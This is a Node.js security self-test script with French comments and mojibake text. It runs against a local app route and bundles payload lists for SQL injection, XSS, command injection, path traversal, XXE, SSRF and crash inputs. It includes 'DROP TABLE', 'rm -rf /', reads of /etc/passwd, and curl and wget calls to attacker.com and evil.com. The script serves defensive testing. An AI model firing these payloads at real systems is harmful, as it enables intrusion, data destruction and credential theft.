#!/usr/bin/env node
/**
 * ğŸš¨ Tests d'Exploitation AvancÃ©s
 * Quand une route non protÃ©gÃ©e est dÃ©tectÃ©e, on teste TOUT
 */

import 'dotenv/config'

const BASE_URL = 'http://localhost:3000'
const COLORS = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
}

const log = (color, message) => console.log(`${COLORS[color]}${message}${COLORS.reset}`)

// ============================================
// PAYLOADS D'EXPLOITATION
// ============================================

const EXPLOIT_PAYLOADS = {
  // 1. SQL INJECTION
  sqlInjection: [
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "' UNION SELECT * FROM users--",
    "admin'--",
    "1' AND 1=1--",
    "1' ORDER BY 10--",
    "' WAITFOR DELAY '00:00:05'--", // Time-based
    "' AND SLEEP(5)--", // MySQL
  ],

  // 2. XSS (Cross-Site Scripting)
  xss: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
  ],

  // 3. COMMAND INJECTION
  commandInjection: [
    '$(curl http://attacker.com)',
    '`curl http://attacker.com`',
    '; cat /etc/passwd',
    '| ls -la',
    '&& whoami',
    '; rm -rf /',
    '$(wget http://evil.com/malware.sh)',
  ],

  // 4. PATH TRAVERSAL
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
  ],

  // 5. LDAP INJECTION
  ldapInjection: [
    '*',
    '*)(&',
    '*)(uid=*))(|(uid=*',
    'admin)(|(password=*))',
  ],

  // 6. XML INJECTION
  xmlInjection: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<![CDATA[<script>alert("XSS")</script>]]>',
  ],

  // 7. NOSQL INJECTION
  noSqlInjection: [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "this.password.match(/.*/)"}',
  ],

  // 8. SSRF (Server-Side Request Forgery)
  ssrf: [
    'http://localhost:22',
    'http://169.254.169.254/latest/meta-data/',
    'http://127.0.0.1:3000/admin',
    'file:///etc/passwd',
  ],

  // 9. HEADER INJECTION
  headerInjection: [
    'test\r\nX-Injected: true',
    'test\nSet-Cookie: admin=true',
  ],

  // 10. BUFFER OVERFLOW
  bufferOverflow: [
    'A'.repeat(10000),
    'A'.repeat(100000),
  ],
}

// ============================================
// TESTS D'EXPLOITATION PAR CATÃ‰GORIE
// ============================================

async function testSQLInjection(url) {
  log('cyan', '\nğŸ’‰ Test SQL Injection')
  const vulnerabilities = []

  for (const payload of EXPLOIT_PAYLOADS.sqlInjection) {
    try {
      const testUrl = `${BASE_URL}${url}?id=${encodeURIComponent(payload)}`
      const response = await fetch(testUrl)
      const text = await response.text()

      // DÃ©tection de vulnÃ©rabilitÃ©
      if (
        text.includes('SQL syntax') ||
        text.includes('mysql_') ||
        text.includes('SQLite') ||
        text.includes('PostgreSQL') ||
        text.includes('ORA-') ||
        response.status === 500
      ) {
        log('red', `  âŒ VULNÃ‰RABLE: ${payload.substring(0, 30)}...`)
        vulnerabilities.push({
          type: 'SQL Injection',
          payload,
          evidence: text.substring(0, 100),
        })
      } else {
        log('green', `  âœ… ProtÃ©gÃ©: ${payload.substring(0, 30)}...`)
      }

      await new Promise((resolve) => setTimeout(resolve, 100))
    } catch (error) {
      log('yellow', `  âš ï¸  Erreur: ${error.message}`)
    }
  }

  return vulnerabilities
}

async function testXSS(url) {
  log('cyan', '\nğŸ”´ Test XSS (Cross-Site Scripting)')
  const vulnerabilities = []

  for (const payload of EXPLOIT_PAYLOADS.xss) {
    try {
      const response = await fetch(`${BASE_URL}${url}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ input: payload }),
      })

      const text = await response.text()

      // DÃ©tection XSS non encodÃ©
      if (text.includes('<script>') || text.includes('onerror=') || text.includes(payload)) {
        log('red', `  âŒ VULNÃ‰RABLE XSS: ${payload.substring(0, 40)}...`)
        vulnerabilities.push({
          type: 'XSS',
          payload,
          evidence: 'Payload reflected without encoding',
        })
      } else {
        log('green', `  âœ… EncodÃ©: ${payload.substring(0, 40)}...`)
      }

      await new Promise((resolve) => setTimeout(resolve, 100))
    } catch (error) {
      log('yellow', `  âš ï¸  Erreur: ${error.message}`)
    }
  }

  return vulnerabilities
}

async function testCommandInjection(url) {
  log('cyan', '\nâš¡ Test Command Injection')
  const vulnerabilities = []

  for (const payload of EXPLOIT_PAYLOADS.commandInjection) {
    try {
      const startTime = Date.now()

      const response = await fetch(`${BASE_URL}${url}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: payload }),
      })

      const executionTime = Date.now() - startTime
      const text = await response.text()

      // DÃ©tection de command injection
      if (
        text.includes('root:') ||
        text.includes('/bin/bash') ||
        text.includes('uid=') ||
        executionTime > 5000 // Sleep dÃ©tectÃ©
      ) {
        log('red', `  âŒ VULNÃ‰RABLE CMD: ${payload.substring(0, 30)}...`)
        vulnerabilities.push({
          type: 'Command Injection',
          payload,
          evidence: text.substring(0, 100),
        })
      } else {
        log('green', `  âœ… BloquÃ©: ${payload.substring(0, 30)}...`)
      }

      await new Promise((resolve) => setTimeout(resolve, 100))
    } catch (error) {
      log('yellow', `  âš ï¸  Erreur: ${error.message}`)
    }
  }

  return vulnerabilities
}

async function testPathTraversal(url) {
  log('cyan', '\nğŸ“ Test Path Traversal')
  const vulnerabilities = []

  for (const payload of EXPLOIT_PAYLOADS.pathTraversal) {
    try {
      const testUrl = `${BASE_URL}${url}?file=${encodeURIComponent(payload)}`
      const response = await fetch(testUrl)
      const text = await response.text()

      // DÃ©tection de fichiers systÃ¨me
      if (
        text.includes('root:x:0:0') ||
        text.includes('[boot loader]') ||
        text.includes('/bin/bash')
      ) {
        log('red', `  âŒ VULNÃ‰RABLE PATH: ${payload}`)
        vulnerabilities.push({
          type: 'Path Traversal',
          payload,
          evidence: 'System file exposed',
        })
      } else {
        log('green', `  âœ… ProtÃ©gÃ©: ${payload}`)
      }

      await new Promise((resolve) => setTimeout(resolve, 100))
    } catch (error) {
      log('yellow', `  âš ï¸  Erreur: ${error.message}`)
    }
  }

  return vulnerabilities
}

async function testSSRF(url) {
  log('cyan', '\nğŸŒ Test SSRF (Server-Side Request Forgery)')
  const vulnerabilities = []

  for (const payload of EXPLOIT_PAYLOADS.ssrf) {
    try {
      const response = await fetch(`${BASE_URL}${url}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: payload }),
      })

      const text = await response.text()

      // DÃ©tection SSRF
      if (
        text.includes('ami-id') || // AWS metadata
        text.includes('instance-id') ||
        text.includes('root:x:0') ||
        response.status === 200
      ) {
        log('red', `  âŒ VULNÃ‰RABLE SSRF: ${payload}`)
        vulnerabilities.push({
          type: 'SSRF',
          payload,
          evidence: 'Internal resource accessible',
        })
      } else {
        log('green', `  âœ… BloquÃ©: ${payload}`)
      }

      await new Promise((resolve) => setTimeout(resolve, 100))
    } catch (error) {
      log('yellow', `  âš ï¸  Erreur: ${error.message}`)
    }
  }

  return vulnerabilities
}

async function testBufferOverflow(url) {
  log('cyan', '\nğŸ’¥ Test Buffer Overflow')
  const vulnerabilities = []

  for (const payload of EXPLOIT_PAYLOADS.bufferOverflow) {
    try {
      const response = await fetch(`${BASE_URL}${url}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data: payload }),
      })

      if (response.status === 500 || response.status === 502) {
        log('red', `  âŒ CRASH POSSIBLE: ${payload.length} caractÃ¨res`)
        vulnerabilities.push({
          type: 'Buffer Overflow',
          payload: `${payload.length} chars`,
          evidence: `Server crashed (${response.status})`,
        })
      } else {
        log('green', `  âœ… GÃ©rÃ©: ${payload.length} caractÃ¨res`)
      }

      await new Promise((resolve) => setTimeout(resolve, 100))
    } catch (error) {
      log('red', `  âŒ SERVER DOWN: ${error.message}`)
      vulnerabilities.push({
        type: 'Buffer Overflow',
        payload: 'Large payload',
        evidence: 'Server unreachable',
      })
    }
  }

  return vulnerabilities
}

async function testAuthentication(url) {
  log('cyan', '\nğŸ”‘ Test Broken Authentication')
  const vulnerabilities = []

  const authTests = [
    { name: 'No token', headers: {} },
    { name: 'Empty token', headers: { Authorization: '' } },
    { name: 'Invalid token', headers: { Authorization: 'Bearer invalid' } },
    { name: 'Expired token', headers: { Authorization: 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...' } },
    { name: 'None algorithm', headers: { Authorization: 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0...' } },
  ]

  for (const test of authTests) {
    try {
      const response = await fetch(`${BASE_URL}${url}`, {
        headers: test.headers,
      })

      if (response.status === 200) {
        log('red', `  âŒ Accessible: ${test.name}`)
        vulnerabilities.push({
          type: 'Broken Authentication',
          payload: test.name,
          evidence: 'Route accessible without valid auth',
        })
      } else {
        log('green', `  âœ… BloquÃ©: ${test.name} (${response.status})`)
      }

      await new Promise((resolve) => setTimeout(resolve, 100))
    } catch (error) {
      log('yellow', `  âš ï¸  Erreur: ${error.message}`)
    }
  }

  return vulnerabilities
}

async function testDataExfiltration(url) {
  log('cyan', '\nğŸ“¤ Test Data Exfiltration')
  const vulnerabilities = []

  // Test si on peut extraire des donnÃ©es sensibles
  try {
    const response = await fetch(`${BASE_URL}${url}`)
    const text = await response.text()

    const sensitivePatterns = [
      { name: 'Email', regex: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/ },
      { name: 'Phone', regex: /\d{3}[-.]?\d{3}[-.]?\d{4}/ },
      { name: 'Credit Card', regex: /\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}/ },
      { name: 'SSN', regex: /\d{3}-\d{2}-\d{4}/ },
      { name: 'API Key', regex: /[a-zA-Z0-9]{32,}/ },
      { name: 'JWT', regex: /eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*/ },
      { name: 'Password Hash', regex: /\$2[aby]\$\d+\$[./A-Za-z0-9]{53}/ },
    ]

    for (const pattern of sensitivePatterns) {
      const matches = text.match(pattern.regex)
      if (matches) {
        log('red', `  âŒ ${pattern.name} exposÃ©: ${matches[0].substring(0, 20)}...`)
        vulnerabilities.push({
          type: 'Data Exposure',
          payload: pattern.name,
          evidence: matches[0].substring(0, 50),
        })
      } else {
        log('green', `  âœ… Pas de ${pattern.name}`)
      }
    }
  } catch (error) {
    log('yellow', `  âš ï¸  Erreur: ${error.message}`)
  }

  return vulnerabilities
}

// ============================================
// SCAN COMPLET D'UNE ROUTE NON PROTÃ‰GÃ‰E
// ============================================

async function fullExploitScan(targetUrl) {
  log('magenta', '\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—')
  log('magenta', 'â•‘  ğŸš¨ SCAN COMPLET D\'EXPLOITATION - ROUTE NON PROTÃ‰GÃ‰E    â•‘')
  log('magenta', 'â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')

  log('yellow', `\nğŸ¯ Cible: ${targetUrl}`)
  log('yellow', 'âš ï¸  Cette route est ACCESSIBLE sans authentification!\n')

  const allVulnerabilities = []

  // 1. SQL Injection
  const sqlVulns = await testSQLInjection(targetUrl)
  allVulnerabilities.push(...sqlVulns)

  // 2. XSS
  const xssVulns = await testXSS(targetUrl)
  allVulnerabilities.push(...xssVulns)

  // 3. Command Injection
  const cmdVulns = await testCommandInjection(targetUrl)
  allVulnerabilities.push(...cmdVulns)

  // 4. Path Traversal
  const pathVulns = await testPathTraversal(targetUrl)
  allVulnerabilities.push(...pathVulns)

  // 5. SSRF
  const ssrfVulns = await testSSRF(targetUrl)
  allVulnerabilities.push(...ssrfVulns)

  // 6. Buffer Overflow
  const bufferVulns = await testBufferOverflow(targetUrl)
  allVulnerabilities.push(...bufferVulns)

  // 7. Authentication Bypass
  const authVulns = await testAuthentication(targetUrl)
  allVulnerabilities.push(...authVulns)

  // 8. Data Exfiltration
  const dataVulns = await testDataExfiltration(targetUrl)
  allVulnerabilities.push(...dataVulns)

  // Rapport final
  log('cyan', '\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
  log('cyan', 'ğŸ“Š RAPPORT D\'EXPLOITATION')
  log('cyan', 'â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')

  if (allVulnerabilities.length === 0) {
    log('green', '\nğŸ‰ AUCUNE vulnÃ©rabilitÃ© critique dÃ©tectÃ©e!')
    log('yellow', 'âš ï¸  Mais la route reste non protÃ©gÃ©e (pas d\'auth)')
  } else {
    log('red', `\nâŒ ${allVulnerabilities.length} VULNÃ‰RABILITÃ‰S DÃ‰TECTÃ‰ES!\n`)

    // Grouper par type
    const byType = {}
    allVulnerabilities.forEach((v) => {
      if (!byType[v.type]) byType[v.type] = []
      byType[v.type].push(v)
    })

    Object.entries(byType).forEach(([type, vulns]) => {
      log('red', `\nğŸ”´ ${type}: ${vulns.length} vulnÃ©rabilitÃ©(s)`)
      vulns.forEach((v) => {
        log('red', `   - Payload: ${v.payload}`)
        log('yellow', `     Evidence: ${v.evidence}`)
      })
    })

    log('red', '\n\nğŸš¨ ACTIONS REQUISES:')
    log('yellow', '  1. Ajouter authentification (JWT/session)')
    log('yellow', '  2. Valider toutes les entrÃ©es utilisateur')
    log('yellow', '  3. Encoder les sorties (XSS)')
    log('yellow', '  4. Utiliser prepared statements (SQL)')
    log('yellow', '  5. Limiter les accÃ¨s fichiers')
    log('yellow', '  6. Bloquer SSRF avec whitelist')
  }

  log('cyan', '\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n')

  return allVulnerabilities
}

// ============================================
// MAIN
// ============================================

const targetRoute = process.argv[2] || '/api/sentinel/execute'

fullExploitScan(targetRoute).catch(console.error)
